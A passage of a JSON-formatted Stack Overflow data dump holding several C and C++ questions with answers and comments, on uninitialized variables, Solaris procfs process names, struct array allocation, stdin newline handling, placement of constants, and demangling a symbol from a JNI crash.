uninitialized in main: 0\n  uninitialized in hello: 32672\n  user@toad:~$ ./a.out \n  uninitialized in main: 0\n  uninitialized in hello: 32679\n  user@toad:~$ ./a.out \n  uninitialized in main: 0\n  uninitialized in hello: 32599\n  user@toad:~$ ./a.out \n  uninitialized in main: 0\n  uninitialized in hello: 32560\n  user@toad:~$ ./a.out \n  uninitialized in main: 0\n  uninitialized in hello: 32585\n</code></pre>\n\n<p>Why <code>main()</code> function prints</p>\n\n<blockquote>\n  <p>uninitialized in main: 0</p>\n</blockquote>\n\n<p>but <code>hello()</code> function prints</p>\n\n<blockquote>\n  <p>uninitialized in hello: [some garbage value.]</p>\n</blockquote>\n\n<p>Is it is undefined behaviour? </p>\n"}, {"tags": ["c++", "c", "unix", "solaris", "procfs"], "answers": [{"comments": [{"owner": {"reputation": 479, "user_id": 2239021, "user_type": "registered", "accept_rate": 72, "profile_image": "https://i.stack.imgur.com/Utg69.jpg?s=128&g=1", "display_name": "mSatyam", "link": "https://stackoverflow.com/users/2239021/msatyam"}, "edited": false, "score": 0, "creation_date": 1457528787, "post_id": 35890430, "comment_id": 59445692, "body": "is there a pre-defined struct in which I can store data of this map file."}, {"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "reply_to_user": {"reputation": 479, "user_id": 2239021, "user_type": "registered", "accept_rate": 72, "profile_image": "https://i.stack.imgur.com/Utg69.jpg?s=128&g=1", "display_name": "mSatyam", "link": "https://stackoverflow.com/users/2239021/msatyam"}, "edited": false, "score": 0, "creation_date": 1457610453, "post_id": 35890430, "comment_id": 59489655, "body": "@mSatyam It&#39;s on the same <code>proc.4</code> man page you linked in your question."}, {"owner": {"reputation": 479, "user_id": 2239021, "user_type": "registered", "accept_rate": 72, "profile_image": "https://i.stack.imgur.com/Utg69.jpg?s=128&g=1", "display_name": "mSatyam", "link": "https://stackoverflow.com/users/2239021/msatyam"}, "edited": false, "score": 0, "creation_date": 1458035287, "post_id": 35890430, "comment_id": 59666811, "body": "I tried reading the map data file into prmap_t struct but when I printed the data member pr_mapname it was an empty string. Did you intended me to do something else. Am I doing right?"}, {"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "reply_to_user": {"reputation": 479, "user_id": 2239021, "user_type": "registered", "accept_rate": 72, "profile_image": "https://i.stack.imgur.com/Utg69.jpg?s=128&g=1", "display_name": "mSatyam", "link": "https://stackoverflow.com/users/2239021/msatyam"}, "edited": false, "score": 0, "creation_date": 1458071007, "post_id": 35890430, "comment_id": 59692710, "body": "How did you read the map data?  You pretty much need to read binary <code>prmap_t</code> structures from <code>&#47;proc&#47;pid&#47;map</code> with one low-level <code>read()</code> call."}, {"owner": {"reputation": 479, "user_id": 2239021, "user_type": "registered", "accept_rate": 72, "profile_image": "https://i.stack.imgur.com/Utg69.jpg?s=128&g=1", "display_name": "mSatyam", "link": "https://stackoverflow.com/users/2239021/msatyam"}, "edited": false, "score": 0, "creation_date": 1458149631, "post_id": 35890430, "comment_id": 59734708, "body": "I read it the same way I read psinfo struct as in my question. Will try with low level read call now."}], "tags": [], "owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "is_accepted": false, "score": 2, "last_activity_date": 1457523156, "creation_date": 1457523156, "answer_id": 35890430, "question_id": 35888100, "link": "https://stackoverflow.com/questions/35888100/psinfo-t-solaris-does-not-contain-full-process-name-in-its-field/35890430#35890430", "title": "psinfo_t solaris does not contain full process name in its field", "body": "<p>The <code>pr_fname</code> field of the <code>psinfo_t</code> structure is 16 bytes long, per <a href=\"http://src.illumos.org/source/xref/illumos-gate/usr/src/uts/common/sys/procfs.h#240\" rel=\"nofollow\">the source code</a>:</p>\n\n<pre><code>#define PRFNSZ      16  /* Maximum size of execed filename */\n</code></pre>\n\n<p>So it will in fact be truncated to a maximum of 15 characters.</p>\n\n<p>You can get the the name of the actual binary file from <code>/proc/PID/map</code>.  For a 32-bit process the exec'd binary will be mapped at address <code>0x00010000</code>.</p>\n\n<p>You can browse the source code for <code>ps</code> at <a href=\"http://src.illumos.org/source/xref/illumos-gate/usr/src/cmd/ps/\" rel=\"nofollow\">http://src.illumos.org/source/xref/illumos-gate/usr/src/cmd/ps/</a> if you want to see where it finds its data.</p>\n"}, {"tags": [], "owner": {"reputation": 3921, "user_id": 46220, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fc77d5a13726cfd5528da0f809153956?s=128&d=identicon&r=PG", "display_name": "alanc", "link": "https://stackoverflow.com/users/46220/alanc"}, "is_accepted": false, "score": 2, "last_activity_date": 1457541554, "creation_date": 1457541554, "answer_id": 35897431, "question_id": 35888100, "link": "https://stackoverflow.com/questions/35888100/psinfo-t-solaris-does-not-contain-full-process-name-in-its-field/35897431#35897431", "title": "psinfo_t solaris does not contain full process name in its field", "body": "<p>Solaris 11.3 SRU 5 introduced <code>/proc/&lt;pid&gt;/execname</code> which contains the full command name, so you can check to see if that file exists and use it if so, else fall back to the limited <code>pr_fname</code>.</p>\n\n<p>See <a href=\"https://blogs.oracle.com/casper/entry/solaris_11_3_sru_5\" rel=\"nofollow\">Solaris 11.3 SRU 5.6: updates in ps(1) and /proc/&lt;pid>/{cmdline,environ,execname}</a> for details.</p>\n"}], "owner": {"reputation": 479, "user_id": 2239021, "user_type": "registered", "accept_rate": 72, "profile_image": "https://i.stack.imgur.com/Utg69.jpg?s=128&g=1", "display_name": "mSatyam", "link": "https://stackoverflow.com/users/2239021/msatyam"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 805, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1457541554, "creation_date": 1457517030, "question_id": 35888100, "link": "https://stackoverflow.com/questions/35888100/psinfo-t-solaris-does-not-contain-full-process-name-in-its-field", "title": "psinfo_t solaris does not contain full process name in its field", "body": "<p>Not getting full process name in psinfo_t struct's field pr_fname while reading process info from psinfo data file(/proc/%d/psinfo) into struct psinfo_t from procfs.h in solaris.</p>\n\n<p>Full psinfo_t struct definition is present on below site:</p>\n\n<p><a href=\"http://docs.oracle.com/cd/E19253-01/816-5174/6mbb98ui2/index.html\" rel=\"nofollow\">http://docs.oracle.com/cd/E19253-01/816-5174/6mbb98ui2/index.html</a></p>\n\n<p>Only if the process name is less than equal to 15 characters then I am getting the full process name other wise if process name is more than 15 characters then I am getting only first 15 characters of process name rest characters are truncated.</p>\n\n<p>The code I am using is as below:</p>\n\n<pre><code>#include &lt;iostream&gt;\n#include &lt;cstdlib&gt;\n#include &lt;procfs.h&gt;\n#include &lt;fstream&gt;\n#include &lt;string&gt;\n\nusing namespace std;\n\nint main(int argc, char* argv[])\n{\n    // get the pid from command line\n    int pid  = atoi(argv[1]);\n\n    // create the pstatus struct from procfs\n    psinfo_t info;\n\n    char file[100];\n    sprintf(file, \"/proc/%d/psinfo\", pid);\n    ifstream in(file);\n    if (in)\n    {\n        in.read((char*)&amp;info, sizeof(psinfo_t));\n        in.close();\n\n        cout &lt;&lt; \"My Name: \" &lt;&lt; info.pr_fname &lt;&lt; endl;\n    }\n    else\n    {\n        cout &lt;&lt; \"Process Not Exists!\" &lt;&lt; endl;\n    }\n\nreturn 0;\n}\n</code></pre>\n\n<p>Do I have to read some other file (other than psinfo) from procfs file system in order to get full process name.\nAlso if I am using belwo ps command from command line then I am able to get full process name:</p>\n\n<pre><code>ps -p 4970 -o comm\n</code></pre>\n\n<p>but I don't want to get process name by executing ps command inside my code.\nI am curious from where ps binary is picking up the process name.</p>\n"}, {"tags": ["c", "arrays", "pointers", "struct"], "answers": [{"comments": [{"owner": {"reputation": 35, "user_id": 5977887, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/7fZ7P.jpg?s=128&g=1", "display_name": "Carl Chester Ragudo", "link": "https://stackoverflow.com/users/5977887/carl-chester-ragudo"}, "edited": false, "score": 0, "creation_date": 1457521038, "post_id": 35887952, "comment_id": 59440203, "body": "I tried inserting the malloc line just before the inner for as you suggested but it now reported invalid use of flexible array member."}, {"owner": {"reputation": 35, "user_id": 5977887, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/7fZ7P.jpg?s=128&g=1", "display_name": "Carl Chester Ragudo", "link": "https://stackoverflow.com/users/5977887/carl-chester-ragudo"}, "edited": false, "score": 0, "creation_date": 1457524942, "post_id": 35887952, "comment_id": 59442948, "body": "this helps a lot! there are no problems on the syntax but the program still crashes. I&#39;ve done some checks and it seems the file pointer is not reading the values from the file anymore thus the members of structure openings have 0.0 as values. The program also does not proceed back to the outer loop and stops process on the last iteration of the inner loop. Any thoughts? Thanks again for the help!"}, {"owner": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "reply_to_user": {"reputation": 35, "user_id": 5977887, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/7fZ7P.jpg?s=128&g=1", "display_name": "Carl Chester Ragudo", "link": "https://stackoverflow.com/users/5977887/carl-chester-ragudo"}, "edited": false, "score": 0, "creation_date": 1457525072, "post_id": 35887952, "comment_id": 59443035, "body": "@CarlChesterRagudo First guess: <code>S-&gt;nPanels = 1</code> and you must check how data are organize into your source file. Post a new question with your code and a sample of file content."}], "tags": [], "owner": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "is_accepted": false, "score": 2, "last_activity_date": 1457527512, "last_edit_date": 1457527512, "creation_date": 1457516616, "answer_id": 35887952, "question_id": 35887849, "link": "https://stackoverflow.com/questions/35887849/struct-handling-and-array-of-structs/35887952#35887952", "title": "Struct handling and array of structs", "body": "<p>Accessing <code>S-&gt;panels[i]-&gt;openings[j]</code> is <a href=\"https://en.wikipedia.org/wiki/Undefined_behavior\" rel=\"nofollow\">UB</a>, because you did not allocate space for that array.</p>\n\n<pre><code>    if (S-&gt;panels[i].nOpenings &gt; 0)\n    {\n         S-&gt;panels[i].openings = malloc(sizeof(CHBPanel)*S-&gt;panels[i].nOpenings);\n\n         // inner for\n    }\n</code></pre>\n\n<p>Pre allocated space for <code>openings</code> pointer with:</p>\n\n<pre><code>CHBOpening *openings = malloc(sizeof(CHBOpening));\n</code></pre>\n\n<p>will cause memory leak, because no code will free that memory due to the fact that the address will be lost by the <code>j</code> inner <code>for</code> with code</p>\n\n<pre><code>openings = S-&gt;panels[i]-&gt;openings[j];\n</code></pre>\n\n<p>You can avoid to have a pointer and write</p>\n\n<pre><code>        for (j=0; j&lt;S-&gt;panels[i].nOpenings;j++)\n        {\n            fscanf(fp,\"%d\",&amp;S-&gt;panels[i].openings[j].id);\n            fscanf(fp,\"%lf\",&amp;S-&gt;panels[i].openings[j].length);\n            fscanf(fp,\"%lf\",&amp;S-&gt;panels[i].openings[j].height);\n            fscanf(fp,\"%lf\",&amp;S-&gt;panels[i].openings[j].origX);\n            fscanf(fp,\"%lf\",&amp;S-&gt;panels[i].openings[j].origY);\n        }\n</code></pre>\n\n<p>In your structure <code>CHBPanel *panels[];</code> and <code>CHBOpening *openings[];</code> have to be:</p>\n\n<pre><code>CHBPanel *panels; \nCHBOpening *openings;\n</code></pre>\n\n<p>Last but not least thing: you must study something about pointers and <code>-&gt;</code> and <code>.</code> usage.</p>\n\n<p>Your code should be like:</p>\n\n<pre><code>int ReadPanelBlock (FILE *fp, CHBStructure *S)\n{\n    int i,j;\n    S-&gt;panels = malloc(S-&gt;nPanels*sizeof(CHBPanel));\n    for (i=0; i&lt; S-&gt;nPanels; i++)\n    {\n        fscanf(fp,\"%d\",&amp;S-&gt;panels[i].id);\n        fscanf(fp,\"%lf\",&amp;S-&gt;panels[i].length);\n        fscanf(fp,\"%lf\",&amp;S-&gt;panels[i].height);\n        fscanf(fp,\"%lf\",&amp;S-&gt;panels[i].angle);\n        fscanf(fp,\"%lf\",&amp;S-&gt;panels[i].origX);\n        fscanf(fp,\"%lf\",&amp;S-&gt;panels[i].origY);\n        fscanf(fp,\"%lf\",&amp;S-&gt;panels[i].origZ);\n        fscanf(fp,\"%d\",&amp;S-&gt;panels[i].nOpenings);\n        if (S-&gt;panels[i].nOpenings &gt; 0)\n        {\n            S-&gt;panels[i].openings = malloc(sizeof(CHBOpening)*S-&gt;panels[i].nOpenings);\n\n            for (j=0; j&lt;S-&gt;panels[i].nOpenings;j++)\n            {\n                fscanf(fp,\"%d\",&amp;S-&gt;panels[i].openings[j].id);\n                fscanf(fp,\"%lf\",&amp;S-&gt;panels[i].openings[j].length);\n                fscanf(fp,\"%lf\",&amp;S-&gt;panels[i].openings[j].height);\n                fscanf(fp,\"%lf\",&amp;S-&gt;panels[i].openings[j].origX);\n                fscanf(fp,\"%lf\",&amp;S-&gt;panels[i].openings[j].origY);\n            }\n        }\n    }\n    return 1;\n}\n</code></pre>\n"}], "owner": {"reputation": 35, "user_id": 5977887, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/7fZ7P.jpg?s=128&g=1", "display_name": "Carl Chester Ragudo", "link": "https://stackoverflow.com/users/5977887/carl-chester-ragudo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 53, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1457527512, "creation_date": 1457516335, "last_edit_date": 1457521361, "question_id": 35887849, "link": "https://stackoverflow.com/questions/35887849/struct-handling-and-array-of-structs", "title": "Struct handling and array of structs", "body": "<p>I am writing a code to store data from a text file. The code compiles but it seems to stop running in the for-loop in the <code>ReadPanelBlock</code> function. It is structured as:\n<code>CHBStructure</code> contains <code>CHBPanels</code> which contains <code>CHBOpenings</code>. The functions were created to read from an input text file which I organized into data blocks for easy reading.  </p>\n\n<pre><code>typedef struct _open\n{\n    int id;\n    double length;\n    double height;\n    double origX;\n    double origY;\n    int frames;\n\n    double thickness;\n    double E;\n    double v;\n}CHBOpening;\n\ntypedef struct _panels\n{\n    int id;\n    double length;\n    double height;\n    double origX;\n    double origY;\n    double origZ;\n    double angle;\n    int nOpenings;\n    int nReinforcement;\n    double *xReinf;\n    double sx;\n    double xReinf0;\n\n    CHBUnit *chb;\n    CHBOpening *openings[];\n}CHBPanel;\n\ntypedef struct _chb\n{\n    int nStories;\n    int nModes;\n    int nIter;\n    int nPanels;\n    CHBPanel *panels[];\n}CHBStructure;\n\nint ReadPanelBlock (FILE *fp, CHBStructure *S)\n{\n    CHBOpening *openings = malloc(sizeof(CHBOpening));\n    *S-&gt;panels = malloc(S-&gt;nPanels*sizeof(CHBPanel));\n    for (i=0; i&lt;S-&gt;nPanels; i++)\n    {\n        fscanf(fp,\"%d\",&amp;S-&gt;panels[i]-&gt;id);\n        fscanf(fp,\"%lf\",&amp;S-&gt;panels[i]-&gt;length);\n        fscanf(fp,\"%lf\",&amp;S-&gt;panels[i]-&gt;height);\n        fscanf(fp,\"%lf\",&amp;S-&gt;panels[i]-&gt;angle);\n        fscanf(fp,\"%lf\",&amp;S-&gt;panels[i]-&gt;origX);\n        fscanf(fp,\"%lf\",&amp;S-&gt;panels[i]-&gt;origY);\n        fscanf(fp,\"%lf\",&amp;S-&gt;panels[i]-&gt;origZ);\n        fscanf(fp,\"%d\",&amp;S-&gt;panels[i]-&gt;nOpenings);\n        if (S-&gt;panels[i]-&gt;nOpenings &gt; 0)\n        {\n            for (j=0; j&lt;S-&gt;panels[i]-&gt;nOpenings;j++)\n            {\n                openings = S-&gt;panels[i]-&gt;openings[j];\n                fscanf(fp,\"%d\",&amp;openings-&gt;id);\n                fscanf(fp,\"%lf\",&amp;openings-&gt;length);\n                fscanf(fp,\"%lf\",&amp;openings-&gt;height);\n                fscanf(fp,\"%lf\",&amp;openings-&gt;origX);\n                fscanf(fp,\"%lf\",&amp;openings-&gt;origY);\n            }\n        }\n    }\n    return 1;\n}\n</code></pre>\n\n<p>EDIT 1: I tried tracing where the error occurs by printing text in each line and it seems to crash in the first fscanf function in the ReadPanelBlock function. </p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1457515009, "post_id": 35887025, "comment_id": 59436085, "body": "Left-over line feed character in stdin... likely the most FAQ C question on SO."}], "answers": [{"tags": [], "owner": {"reputation": 29294, "user_id": 2659313, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9828b91aef4c2b3cf14f3501e0a20e33?s=128&d=identicon&r=PG", "display_name": "Mohit Jain", "link": "https://stackoverflow.com/users/2659313/mohit-jain"}, "is_accepted": true, "score": 1, "last_activity_date": 1457514401, "last_edit_date": 1457514401, "creation_date": 1457514045, "answer_id": 35887057, "question_id": 35887025, "link": "https://stackoverflow.com/questions/35887025/struct-got-wrong/35887057#35887057", "title": "Struct got wrong", "body": "<p>Replace <code>fgets(name, LENGTH, stdin);</code> with:</p>\n\n<pre><code>do { fgets(name, LENGTH, stdin); } while(name[0] == '\\0' || name[0] == '\\n');\n</code></pre>\n\n<p>You are reading unused <code>'\\n'</code> from last struct (Left after you read the number.</p>\n\n<p>Alternatively if you name doesn't contain space character, you can also use the following:</p>\n\n<pre><code>scanf(\" %s\", name);\n/*     ^  space   */\n</code></pre>\n"}], "owner": {"reputation": 63, "user_id": 5761512, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/a88a70fbc39b2190569d11806fc3f628?s=128&d=identicon&r=PG&f=1", "display_name": "DR J", "link": "https://stackoverflow.com/users/5761512/dr-j"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 44, "favorite_count": 0, "closed_date": 1457515023, "accepted_answer_id": 35887057, "answer_count": 1, "score": 0, "last_activity_date": 1457514401, "creation_date": 1457513959, "question_id": 35887025, "link": "https://stackoverflow.com/questions/35887025/struct-got-wrong", "closed_reason": "Duplicate", "title": "Struct got wrong", "body": "<p>The code is about some shapes, I want it to get input all the details about the shapes and than prints them. but from some reason I can't input the second name of the struct. help please?</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#define LENGTH 30   \nstruct shape\n{\n    char name[LENGTH];\n    int edge;\n    int special;\n};\nvoid addingshape(struct shape shp1[],int i);\nint main(void)\n{\n    struct shape arrshape[2];\n    printf(\"\\nLets enter your first shape:\\n\");\n    addingshape(arrshape,0);\n    printf(\"\\nLets enter your seconed shape\");\n    addingshape(arrshape,1);\n    system(\"PAUSE\");\n    return 0;\n}\nvoid addingshape(struct shape shp1[],int i)\n{\n    int edge, special;\n    char name[LENGTH] = { 0 };\n    printf(\"Please enter details of some shape\\n\");\n    printf(\"Enter name of the shape\\n\");\n    fgets(name, LENGTH, stdin);\n    name[strcspn(name, \"\\n\")] = 0;\n    strcpy(shp1[i].name, name);\n    printf(\"Please enter number of edge's\\n\");\n    scanf(\"%d\", &amp;edge);\n    shp1[i].edge = edge;\n    printf(\"Now enter 1 if the shape is special, and 0 if the shape is not special\\n\");\n    do\n    {\n        scanf(\"%d\", &amp;special);\n        if (special != 1 &amp;&amp; special != 0)\n        {\n            printf(\"not good choice, please try again\\n\");\n        }\n    } while (special != 1 &amp;&amp; special != 0);\n    shp1[i].special = special;\n    printf(\"The name of the shape: %s\\nNumber of edge's is: %d\\nIf the shape is special: %d\\n\", shp1[i].name, shp1[i].edge, shp1[i].special);\n}\n</code></pre>\n"}, {"tags": ["c"], "answers": [{"comments": [{"owner": {"reputation": 946, "user_id": 5405191, "user_type": "registered", "accept_rate": 64, "profile_image": "https://lh5.googleusercontent.com/-4P9RvEs8-eM/AAAAAAAAAAI/AAAAAAAAAA4/sRL7T9ciO7U/photo.jpg?sz=128", "display_name": "Akay", "link": "https://stackoverflow.com/users/5405191/akay"}, "edited": false, "score": 0, "creation_date": 1457967540, "post_id": 35887083, "comment_id": 59634349, "body": "Thanks, what would you suggest if we want to share the constants variable across multiple source units? In headers or source file itself?"}, {"owner": {"reputation": 13762, "user_id": 694733, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0a3de8cd40d9ffb86cc1fed0c8cf2e19?s=128&d=identicon&r=PG", "display_name": "user694733", "link": "https://stackoverflow.com/users/694733/user694733"}, "reply_to_user": {"reputation": 946, "user_id": 5405191, "user_type": "registered", "accept_rate": 64, "profile_image": "https://lh5.googleusercontent.com/-4P9RvEs8-eM/AAAAAAAAAAI/AAAAAAAAAA4/sRL7T9ciO7U/photo.jpg?sz=128", "display_name": "Akay", "link": "https://stackoverflow.com/users/5405191/akay"}, "edited": false, "score": 1, "creation_date": 1457968942, "post_id": 35887083, "comment_id": 59635411, "body": "@AbhishekKumar It depends on the usage. If you need to use it in constant expressions, you need to use preprocessor <code>#define</code> or <code>enum</code>. For runtime constants: use <code>static const</code> in source file for local constants, or for global constants non-static <code>const</code> in source and <code>extern const</code> of it in header. You can also use <code>static const</code> in header for small constants, if constant variable for some reason must have internal linkage. So to answer your question, for global constant <i>variable</i>, define it in source, and declare it as <code>extern const</code> in header."}, {"owner": {"reputation": 946, "user_id": 5405191, "user_type": "registered", "accept_rate": 64, "profile_image": "https://lh5.googleusercontent.com/-4P9RvEs8-eM/AAAAAAAAAAI/AAAAAAAAAA4/sRL7T9ciO7U/photo.jpg?sz=128", "display_name": "Akay", "link": "https://stackoverflow.com/users/5405191/akay"}, "edited": false, "score": 0, "creation_date": 1458046866, "post_id": 35887083, "comment_id": 59675416, "body": "I don&#39;t want to use #define based constants because they do not offer any type safety. What I want in the project is to create a separate header file (and no source file) just for storing error values as integers in terms of const int. Can you explain a bit more when you say &quot;You can also use  in header for small constants if constant variable for some reason must have internal linkage.&quot; Why for smaller constants? And is there any difference if I use/not-use static keyword in header file constants."}, {"owner": {"reputation": 13762, "user_id": 694733, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0a3de8cd40d9ffb86cc1fed0c8cf2e19?s=128&d=identicon&r=PG", "display_name": "user694733", "link": "https://stackoverflow.com/users/694733/user694733"}, "reply_to_user": {"reputation": 946, "user_id": 5405191, "user_type": "registered", "accept_rate": 64, "profile_image": "https://lh5.googleusercontent.com/-4P9RvEs8-eM/AAAAAAAAAAI/AAAAAAAAAA4/sRL7T9ciO7U/photo.jpg?sz=128", "display_name": "Akay", "link": "https://stackoverflow.com/users/5405191/akay"}, "edited": false, "score": 1, "creation_date": 1458048664, "post_id": 35887083, "comment_id": 59676863, "body": "@Akay For integer error constants <code>enum</code> is usually the best option."}, {"owner": {"reputation": 13762, "user_id": 694733, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0a3de8cd40d9ffb86cc1fed0c8cf2e19?s=128&d=identicon&r=PG", "display_name": "user694733", "link": "https://stackoverflow.com/users/694733/user694733"}, "reply_to_user": {"reputation": 946, "user_id": 5405191, "user_type": "registered", "accept_rate": 64, "profile_image": "https://lh5.googleusercontent.com/-4P9RvEs8-eM/AAAAAAAAAAI/AAAAAAAAAA4/sRL7T9ciO7U/photo.jpg?sz=128", "display_name": "Akay", "link": "https://stackoverflow.com/users/5405191/akay"}, "edited": false, "score": 1, "creation_date": 1458048680, "post_id": 35887083, "comment_id": 59676874, "body": "@AKay <b>Linkage:</b> Like I said <code>static</code> forces internal linkage, and that means that symbol is local for it&#39;s compilation unit. So, if you define static variable in header and include it in 2 source files, those 2 files will have different copies of the variable. If the constant is big (large structure or array), then you might waste memory."}, {"owner": {"reputation": 13762, "user_id": 694733, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0a3de8cd40d9ffb86cc1fed0c8cf2e19?s=128&d=identicon&r=PG", "display_name": "user694733", "link": "https://stackoverflow.com/users/694733/user694733"}, "reply_to_user": {"reputation": 946, "user_id": 5405191, "user_type": "registered", "accept_rate": 64, "profile_image": "https://lh5.googleusercontent.com/-4P9RvEs8-eM/AAAAAAAAAAI/AAAAAAAAAA4/sRL7T9ciO7U/photo.jpg?sz=128", "display_name": "Akay", "link": "https://stackoverflow.com/users/5405191/akay"}, "edited": false, "score": 1, "creation_date": 1458048852, "post_id": 35887083, "comment_id": 59677000, "body": "@AKay <b>Nonstatic header constant:</b> You should not define non-static variable in header. They have <i>external</i> linkage, and you&#39;ll get linker error for variable redefinion if header is included in 2 or more source files. Thus non-static variables must be <i>defined</i> source file, <i>declared</i> with <code>extern</code> in header file."}, {"owner": {"reputation": 946, "user_id": 5405191, "user_type": "registered", "accept_rate": 64, "profile_image": "https://lh5.googleusercontent.com/-4P9RvEs8-eM/AAAAAAAAAAI/AAAAAAAAAA4/sRL7T9ciO7U/photo.jpg?sz=128", "display_name": "Akay", "link": "https://stackoverflow.com/users/5405191/akay"}, "edited": false, "score": 0, "creation_date": 1458122445, "post_id": 35887083, "comment_id": 59714024, "body": "Thanks @user694733"}], "tags": [], "owner": {"reputation": 13762, "user_id": 694733, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0a3de8cd40d9ffb86cc1fed0c8cf2e19?s=128&d=identicon&r=PG", "display_name": "user694733", "link": "https://stackoverflow.com/users/694733/user694733"}, "is_accepted": true, "score": 5, "last_activity_date": 1457514155, "creation_date": 1457514155, "answer_id": 35887083, "question_id": 35886879, "link": "https://stackoverflow.com/questions/35886879/best-place-to-put-constants/35887083#35887083", "title": "Best place to put constants", "body": "<ol>\n<li><p>Don't expose information you don't need to. If constant is an implementation detail of single compilation unit, there is no need to pollute global namespace. You can always add it to header later if needed.</p></li>\n<li><p>Depends on the nature of constant. <code>static</code> creates new constant for each compilation unit header is included in. If constant is huge, it's better to define it once in source file, and declare it with <code>extern</code> in the header.</p></li>\n</ol>\n"}], "owner": {"reputation": 946, "user_id": 5405191, "user_type": "registered", "accept_rate": 64, "profile_image": "https://lh5.googleusercontent.com/-4P9RvEs8-eM/AAAAAAAAAAI/AAAAAAAAAA4/sRL7T9ciO7U/photo.jpg?sz=128", "display_name": "Akay", "link": "https://stackoverflow.com/users/5405191/akay"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 335, "favorite_count": 1, "accepted_answer_id": 35887083, "answer_count": 1, "score": 4, "last_activity_date": 1457520448, "creation_date": 1457513468, "last_edit_date": 1457520448, "question_id": 35886879, "link": "https://stackoverflow.com/questions/35886879/best-place-to-put-constants", "title": "Best place to put constants", "body": "<ol>\n<li><p>In a multi-source file C application, which is the best place to put constant values, source file itself or in its header file? Provided that constant will be used in that source file only.</p></li>\n<li><p>Is it a good way to keep <code>static const</code> in header files?</p></li>\n</ol>\n"}, {"tags": ["java", "c", "linux", "java-native-interface", "coredump"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 2, "creation_date": 1457513567, "post_id": 35886795, "comment_id": 59435263, "body": "If you put the symbol <code>_Z8ulm_initPKcb</code> into <a href=\"https://demangler.com/\" rel=\"nofollow noreferrer\">an online name demangler</a> you will get<code>ulm_init(char const*, bool)</code>. So if you have a problem it&#39;s in the <code>ulm_init</code> function. Start looking <i>at the source</i> for the function, and if it doesn&#39;t look out of place ask someone else to look at the source. And if both of you think the function is okay, then look at how it&#39;s called, can it be called with a null or otherwise illegal or uninitialized pointer?"}, {"owner": {"reputation": 8351, "user_id": 4279155, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/841b7391f3f7873bec1a8d9d8d2dc759?s=128&d=identicon&r=PG&f=1", "display_name": "Dominique", "link": "https://stackoverflow.com/users/4279155/dominique"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1457514333, "post_id": 35886795, "comment_id": 59435691, "body": "Thanks a lot for the quick reply, @Joachim. Now that I have confirmation that the problem is within the &quot;ulm_init()&quot; function, I&#39;m debugging the project in a better setting in order to have insight on the used parameters. Meanwhile I&#39;m still struggling on the &quot;part.6&quot; suffix. It seems that even the online name demangler you mentioned can&#39;t handle it, while I have seen that another library (of which I&#39;m sure it works) contains a &quot;part.8&quot; suffix. Any idea what it might mean?"}, {"owner": {"reputation": 8351, "user_id": 4279155, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/841b7391f3f7873bec1a8d9d8d2dc759?s=128&d=identicon&r=PG&f=1", "display_name": "Dominique", "link": "https://stackoverflow.com/users/4279155/dominique"}, "reply_to_user": 